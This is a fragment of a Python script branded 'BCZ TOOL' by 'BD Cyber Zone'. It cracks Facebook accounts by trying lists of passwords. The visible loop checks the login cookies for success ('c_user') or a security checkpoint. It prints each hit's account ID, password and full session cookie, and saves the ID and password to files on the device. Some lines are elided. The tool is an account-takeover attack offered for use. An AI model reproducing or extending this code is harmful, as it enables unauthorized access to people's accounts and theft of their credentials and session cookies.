...
#Source By : Farhan Tanzim Sagor
#Team BD Cyber Zone - BCZ
...
\033[1;32m================= \33[33;45mSAGOR\33[0;m =====================
       \33[37;41m\t WELLCOME TO BCZ TOOL\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;32m Farhan Tanzim Sagor 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m(BCZ-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/BCZ-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m(BCZ-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BCZ-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[BCZ] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
